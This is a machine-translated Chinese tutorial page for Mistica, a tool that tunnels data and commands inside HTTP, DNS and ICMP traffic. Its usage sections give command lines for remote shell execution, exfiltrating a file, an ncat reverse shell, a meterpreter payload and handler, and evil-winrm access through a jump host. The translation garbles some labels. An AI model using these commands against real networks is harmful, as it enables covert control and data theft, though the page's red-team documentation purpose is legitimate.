# Mistica:应用协议上任意通信的瑞士军刀

> 原文：<https://kalilinuxtutorials.com/mistica/>

[![Mistica : Swiss Army Knife For Arbitrary Communication Over Application Protocols](img/af3dd4fae02d8121f0e9c4ba0ba84fc0.png "Mistica : Swiss Army Knife For Arbitrary Communication Over Application Protocols")](https://1.bp.blogspot.com/-pF5_m6ub1HY/XyyJnUXZEHI/AAAAAAAAHQU/Cj-XIuC6UGolISWI8cB3_08lmRX-x16iwCLcBGAsYHQ/s728/M%25C3%25ADstica%25281%2529.png)

**Mistica** 是一个允许将数据嵌入应用层协议字段的工具，目的是为任意通信建立一个双向通道。目前，封装成 HTTP、DNS 和 ICMP 协议已经实现，但预计在不久的将来会引入更多的协议。

它有一个模块化的设计，围绕一个自定义的传输协议，称为 SOTP:简单覆盖传输协议。数据被加密、分块并放入 SOTP 数据包中。SOTP 数据包被编码并嵌入到应用协议的所需字段中，然后发送到另一端。

SOTP 层的目标是以最小的开销提供通用的二进制传输协议。SOTP 数据包很容易隐藏或嵌入到合法的应用协议中。此外，SOTP 确保数据包被另一端接收，使用 RC4 加密数据(这在未来可能会改变)，并通过使用轮询机制确保信息可以透明地双向流动。

模块出于不同目的与 SOTP 层交互:

*   包装模块或包装器:这些模块将 SOTP 数据包编码/解码成应用层协议
*   覆盖模块:这些模块可以通过 SOTP 信道进行通信。例子有:io 重定向(像 netcat)，shell(命令执行)，端口转发…

包装器和覆盖模块一起工作以构建定制应用，例如通过 DNS 的输入重定向或通过 HTTP 的远程端口转发。

Mística 的模块化设计便于开发新模块。此外，用户可以轻松地派生当前模块，以便使用一些自定义字段或编码或修改覆盖模块的行为。

软件有两个主要部分:

*   Mística server ( `ms.py`):使用充当所需应用层协议(HTTP、DNS、ICMP…)的服务器的模块。它还被设计成允许多个服务器、包装器和覆盖层同时运行，只有一个`ms.py`实例，尽管这个特性还没有完全实现。
*   Mística client ( `mc.py`):使用模块作为所需应用层协议(HTTP、DNS、ICMP…)的客户端。它只能同时使用一个覆盖和一个包装。

**演示**

你可以在下面的[播放列表](https://www.youtube.com/playlist?list=PLyUtb47GNF9wqIwI1DGpX_Fr1IXpXHRqB)中看到一些音乐演示

**依赖关系**

这个项目有很少的依赖项。目前:

*   Mística 客户端至少需要 Python 3.7
*   Mística 服务器至少需要 Python 3.7 和`dnslib`。

**python3.7 -m pip 安装 pip–用户
pip3.7 安装 DNS lib–用户**

如果您不想在系统上安装 python，可以使用以下可移植版本之一:

*   [https://www.anaconda.com/distribution/#download-section](https://www.anaconda.com/distribution/#download-section)(针对 Windows、Linux 和 macOS)
*   [https://github . com/winpython/winpython/releases/tag/2 . 1 . 2019 09 28](https://github.com/winpython/winpython/releases/tag/2.1.20190928)(仅适用于 Windows)

**当前模块**

覆盖模块:

*   `io`:从标准输入中读取，通过 SOTP 连接发送。从 SOTP 连接读取，打印到标准输出
*   `shell`:执行通过 SOTP 连接接收的命令，并返回输出。与 io 模块兼容。
*   `tcpconnect`:连接 TCP 端口。从套接字读取，通过 SOTP 连接发送。从 SOTP 连接读取，通过套接字发送。
*   `tcplisten`:绑定到 TCP 端口。从套接字读取，通过 SOTP 连接发送。从 SOTP 连接读取，通过套接字发送。

包装模块:

*   `dns`:使用不同的方法对 DNS 查询/响应中的数据进行编码/解码
*   `http`:使用不同的方法对 HTTP 请求/响应中的数据进行编码/解码
*   `icmp`:对数据段上 ICMP 回应请求/响应中的数据进行编码/解码

**用途**

`ms.py`:米斯蒂卡服务器

帮助消息看起来是这样的:

用法:ms . py[-h][-k KEY][-l LIST][-m MODULES][-w WRAPPER _ ARGS]
[-o OVERLAY _ ARGS][-s WRAP _ SERVER _ ARGS]

Mistica 服务器。如果你足够勇敢，任何事都是隧道。不带
参数运行，启动多处理器模式。

可选参数:
-h，–help 显示此帮助信息并退出
-k KEY，–KEY KEY 用于加密通信的 RC4 KEY
-l LIST，–LIST 列出模块或参数。选项有:所有、
覆盖、包装、、
-m 模块、–模块模块
单处理程序模式下的模块对。格式:
' OVERLAY:WRAPPER '
-w WRAPPER _ ARGS，–WRAPPER-ARGS WRAPPER _ ARGS
所选覆盖模块的 args(单处理程序
模式)
-o OVERLAY_ARGS，–OVERLAY-args 所选覆盖模块的 OVERLAY_ARGS
args(单处理程序
模式)
-s WRAP_SERVER_ARGS，–WRAP-SERVER-args WRAP _ SERVER _ ARGS
所选覆盖服务器的 args(单

Mística 服务器有两种主要模式:

*   **单处理器模式**:当`ms.py`带参数启动时，它允许单个覆盖模块与单个包装模块交互。
*   **多处理器模式:**(尚未发布)当`ms.py`在没有参数的情况下运行时，用户进入一个交互控制台，在那里可以启动多个覆盖和包装模块。这些模块将能够相互作用，没有什么限制。

`mc.py`:米斯蒂卡客户端

帮助消息看起来是这样的:

用法:MC . py[-h][-k KEY][-l LIST][-m MODULES][-w WRAPPER _ ARGS]
[-o OVERLAY _ ARGS]

Mistica 客户端。

可选参数:
-h，–help 显示此帮助信息并退出
-k KEY，–KEY KEY 用于加密通信的 RC4 密钥
-l LIST，–LIST 列出模块或参数。选项有:所有、
覆盖、包装、、
-m 模块、–模块模块
模块对。格式:' OVERLAY:WRAPPER '
-w WRAPPER _ ARGS，–WRAPPER-args WRAPPER _ ARGS
args for the selected OVERLAY module
-o OVERLAY _ ARGS，–OVERLAY-args OVERLAY _ ARGS
args for the selected WRAPPER module
-v，–logger 中的详细级别(no -v None，-v Low，-vv
Medium，-vvvv High)

**参数**

*   `**-l, --list**`用于列出`all`个模块，只列出一种:(`overlays`或`wrappers`)或通过`-o`、`-w`或`-s`列出某个模块可以接受的参数。
*   `**-k, --key**`用于指定将用于加密覆盖通信的密钥。这在客户机和服务器中必须相同，并且目前是强制性的。如果秘密共享方案得以实施，这种情况在将来可能会改变。
*   `**-m, --modules**`用于指定你想要使用哪个模块对。必须使用以下格式:**overlay _ module**+**:**+**wrap _ module**。这个参数也是强制性的。
*   `**-w, --wrapper-args**`允许您指定包裹模块的特定配置。
*   `**-o, --overlay-args**`允许您指定覆盖模块的特定配置。
*   `**-s, --wrap-server-args**`只在`ms.py`出现。它允许您为包装服务器指定特定的配置。每个包装模块都依赖于一个包装服务器，这两种配置都可以进行调优

**例子&高级使用**

> 记住，你可以通过输入`**-l <module_name>**`(例如`**./ms.py -l dns**`)看到一个模块的所有被接受的参数。还要记住使用长而复杂的密钥来保护您的通信！

**HTTP**

为了说明 HTTP 封装的不同方法，每个示例都将使用 IO 重定向覆盖模块(`io`)。

*   默认 URI 中使用 b64 编码的 HTTP GET 方法，使用本地主机和端口 8080(默认值)。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey"**`
*   HTTP GET 方法使用默认 URI 中的 b64 编码，**指定 IP 地址和端口**。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -s "--hostname x.x.x.x --port 10000"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--hostname x.x.x.x --port 10000"**`
*   在**自定义 URI** 中使用 b64 编码的 HTTP GET 方法，使用本地主机和端口 8080(默认值)。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--uri /?token="**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--uri /?token="**`
*   使用本地主机和端口 8080(默认值)，在**自定义头**中使用 b64 编码的 HTTP GET 方法。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--header laravel_session"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--header laravel_session"**`
*   HTTP **POST** 方法在默认字段中使用 b64 编码，使用本地主机和端口 8080(默认值)。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--method POST"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--method POST"**`
*   HTTP **POST** 方法，在**自定义头**中使用 b64 编码，使用本地主机和端口 8080(默认值)。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--method POST --header Authorization"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--method POST --header Authorization"**`
*   HTTP **在**自定义字段**中使用 b64 编码发布**方法，使用本地主机和端口 8080(默认值)。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--method POST --post-field data"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--method POST --post-field data"**`
*   HTTP **POST** 方法，在**自定义字段中使用 b64 编码，具有自定义数据包大小、自定义重试次数、自定义超时以及指定 IP 和端口**:
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--method POST --post-field data --max-size 30000 --max-retries 10" -s "--hostname 0.0.0.0 --port 8088 --timeout 30"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--method POST --post-field data --max-size 30000 --max-retries 10 --poll-delay 10 --response-timeout 30 --hostname x.x.x.x --port 8088"**`
*   HTTP **POST** 方法在**自定义字段**、**中使用 b64 编码，使用自定义错误模板**，使用本地主机和端口 8080(默认值)。
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k "rc4testkey" -w "--method POST --post-field data" -s "--error-file /tmp/custom_error_template.html --error-code 408"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--method POST --post-field data"**`
*   在默认 URI 中使用 b64 编码的 HTTP GET 方法，使用**自定义 HTTP 响应代码**并使用本地主机和端口 8080(默认值):
    *   米斯蒂卡服务器:`**./ms.py -m io:http -k test -w "--success-code 302"**`
    *   新闻客户端:`**./mc.py -m io:http -k test -w "--success-code 302"**`

**DNS**

为了说明 DNS 封装的不同方法，每个示例都将使用 IO 重定向覆盖模块(`io`)。

*   TXT 查询，使用本地主机和端口 5353(默认值):
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey"**`
*   NS 查询，使用本地主机和端口 5353(默认值):
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey" -w "--queries NS"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey" -w "--query NS"**`
*   CNAME 查询，使用本地主机和端口 5353(默认值):
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey" -w "--queries CNAME"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey" -w "--query CNAME"**`
*   MX 查询，使用本地主机和端口 5353(默认值):
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey" -w "--queries MX"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey" -w "--query MX"**`
*   SOA 查询，使用本地主机和端口 5353(默认值):
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey" -w "--queries SOA"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey" -w "--query SOA"**`
*   TXT 查询，使用本地主机和端口 5353(默认值)和**自定义域**:
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey" -w "--domains mistica.dev sotp.es"**`
    *   Mística 客户:
        *   `**./mc.py -m io:dns -k "rc4testkey" -w "--domain sotp.es"**`
        *   `**./mc.py -m io:dns -k "rc4testkey" -w "--domain mistica.dev"**`
*   TXT 查询，指定端口和主机名:
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey" -s "--hostname 0.0.0.0 --port 1337"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 1337"**`
*   TXT 查询，使用多个子域:
    *   米斯蒂卡服务器:`**./ms.py -m io:dns -k "rc4testkey"**`
    *   新闻客户端:`**./mc.py -m io:dns -k "rc4testkey" -w "--multiple --max-size 169"**`

**ICMP**

当 Linux 内核收到 icmp 回应请求包时，默认情况下会自动用 icmp 回应回复包进行响应(没有给我们任何回复选项)。这就是为什么我们必须禁用 icmp 响应，以便能够发送我们自己的与客户端发送的数据不同的数据。为此，我们执行以下操作:

禁用自动 icmp 响应由内核( *root 必填*)编辑`/etc/sysctl.conf`文件:

*   将下面一行添加到/etc/sysctl.conf 中:

net . IP v4 . icmp _ echo _ ignore _ all = 1

*   然后，运行:`sysctl -p`生效。

现在，为了说明 ICMP 封装的不同方法，每个示例都将使用 IO 重定向覆盖模块(`io`)。

*   ICMP 数据段，使用接口 eth0:
    *   米斯蒂卡服务器:`**./ms.py -m io:icmp -k "rc4testkey" -s "--iface eth0"**`
    *   新闻客户端:`**./mc.py -m io:icmp -k "rc4testkey" -w "--hostname x.x.x.x"**`

**壳牌&木卫一**

通过组合`io`和`shell`模块，您可以使用 mística 通过自定义通道远程执行命令。示例:

*   使用 TXT 查询通过 DNS 在客户端系统上执行命令。
    *   米斯蒂卡服务器:`**sudo ./ms.py -m io:dns -k "rc4testkey" -s "--hostname x.x.x.x --port 53"**`
    *   新闻客户端:`**./mc.py -m shell:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53"**`
*   使用 GET 请求通过 HTTP 在服务器系统上执行命令:
    *   米斯蒂卡服务器:`**./ms.py -m shell:http -k "rc4testkey" -s "--hostname x.x.x.x --port 8000"**`
    *   新闻客户端:`**./mc.py -m io:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000"**`
*   通过 ICMP 在客户端系统上执行命令:
    *   米斯蒂卡服务器:`**./ms.py -m io:icmp -k "rc4testkey" -s "--iface eth0"**`
    *   新闻客户端:`**./mc.py -m shell:icmp -k "rc4testkey" -w "--hostname x.x.x.x"**`
*   使用 IO 模块和重定向运算符通过 HTTP 过滤文件:
    *   米斯蒂卡服务器:`**./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k "rc4testkey" -vv > confidential.pdf**`
    *   Mística 客户端(**从 cmd** 运行很重要):`**type confidential.pdf | E:\Mistica\WPy64-3741\python-3.7.4.amd64\python.exe .\mc.py -m io:http -w "--hostname x.x.x.x --port 80" -k "rc4testkey" -vv**`

**使用 tcpconnect 和 tcplisten 进行端口转发**

*   通过 HTTP 的远程端口转发(从服务器看)。客户端上的地址`**127.0.0.1:4444**`将被转发到服务器上的地址`**127.0.0.1:5555**`。肯定已经有东西在监听`5555`。
    *   米斯蒂卡服务器:`**./ms.py -m tcpconnect:http -k "rc4testkey" -s "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 5555"**`
    *   新闻客户端:`**./mc.py -m tcplisten:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"**`
*   DNS 上的本地端口转发(从服务器看)。服务器上的地址`127.0.0.1:4444`将被转发到客户端上的地址`127.0.0.1:5555`。肯定已经有东西在监听`5555`。
    *   米斯蒂卡服务器:`**sudo ./ms.py -m tcplisten:dns -k "rc4testkey" -s "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 4444"**`
    *   新闻客户端:`**./mc.py -m tcpconnect:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 5555"**`
*   在 linux 客户端使用 netcat 的 HTTP 反向 shell。
    *   Netcat 监听器(在服务器上): **`nc -nlvp 5555`**
    *   **米斯蒂卡服务器:`./ms.py -m tcpconnect:http -k "rc4testkey" -s "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 5555"`**
    *   新闻客户端:`**./mc.py -m tcplisten:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"**`
    *   Netcat Shell(在 linux 客户端):`**ncat -nve /bin/bash 127.0.0.1 4444**`
*   使用端口转发在 DNS 上运行`**meterpreter_reverse_tcp**` (linux)。使用`**msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f elf -o meterpreter_reverse_tcp_localhost_4444.bin**`生成的有效载荷
    *   在服务器上运行`msfconsole`并使用`handler **-p linux/x64/meterpreter_reverse_tcp -H 127.0.0.1 -P 5555**`启动处理程序
    *   米斯蒂卡服务器:`**sudo ./ms.py -m tcpconnect:dns -k "rc4testkey" -s "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 5555"**`
    *   新闻客户端:`**./mc.py -m tcplisten:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 4444"**`
    *   在客户端运行 meter preter:`**./meterpreter_reverse_tcp_localhost_4444.bin**`
*   [EvilWinrm](https://github.com/Hackplayers/evil-winrm) over ICMP 使用跳转机器访问孤立机器。
    *   神秘服务器:`**./ms.py -m tcplisten:icmp -s "--iface eth0" -k "rc4testkey" -o "--address 127.0.0.1 --port 5555 --persist" -vv**`
    *   神秘客户:`**python.exe .\mc.py -m tcpconnect:icmp -w "--hostname x.x.x.x" -k "rc4testkey" -o "--address x.x.x.x --port 5985 --persist" -vv**`
    *   EvilWinrm 控制台(在 C2 机器上):`**evil-winrm -u Administrador -i 127.0.0.1 -P 5555**`

**码头工人**

已经创建了一个 Docker 映像供本地使用。这避免了我们只有在想要测试工具时才必须安装 Python 或 dnslib，这对于 debug 或类似的工具也非常有趣，因为我们避免了其他本地应用程序产生的噪声。要构建它，我们只需遵循以下步骤:

*   第一次构建图像时使用:

sudo docker build-tag mistica:最新。

*   第二，创建网络:

sudo docker 网络创建 misticanw

*   第三，使用以下命令运行服务器:

sudo docker run–network misticanw–sysctl net . IP v4 . icmp _ echo _ ignore _ all = 1-v $(pwd):/opt/Mistica-it Mistica/bin/bash

*   第四，运行客户端:

sudo dock run–network misticanw-v $(pwd):/opt/mysterious-it mysterious/bin/bash

**未来工作**

*   SOTP 协议的透明 Diffie-Hellman 密钥生成
*   有效负载生成器:代替使用`./mc.py`，这将允许生成带有硬编码参数的特定和最小化的独立二进制客户端。
*   多处理器模式:`ms.py`的交互模式。这将允许用户将一个以上的覆盖图与一个以上的包装器以及每个包装服务器的一个以上的包装模块相结合。
*   定制模块开发的模块开发文档。现在不鼓励这样做，因为模块规范仍在开发中。
*   接下来的模块:
    *   HTTPS 包装纸
    *   SMB 包装
    *   RAT 和 RAT 处理程序覆盖
    *   SOCKS 代理和动态端口转发覆盖
    *   文件传输覆盖
*   用于更复杂封装的自定义 HTTP 模板
*   定制客户端或服务器的 SOTP 协议规范文档。现在不鼓励这样做，因为协议仍在开发中。

**作者&执照**

该项目由 Carlos Fernández Sánchez 和 Raúl Caro Teixidó开发。代码是在 GNU 通用公共许可证 v3 下发布的。

该项目使用第三方开源代码，特别是:

*   斯科特·格里菲斯开发的位串。
*   由大卫·布坎南开发的 RC4 二进制安全软件。
*   [Vlad Vitan 开发的无依赖关系的 DNS 客户端](https://github.com/vlasebian/simple-dns-client)。
*   Raul Caro 开发的无依赖关系的 ICMP 服务器和客户端。

[**Download**](https://github.com/IncideDigital/Mistica)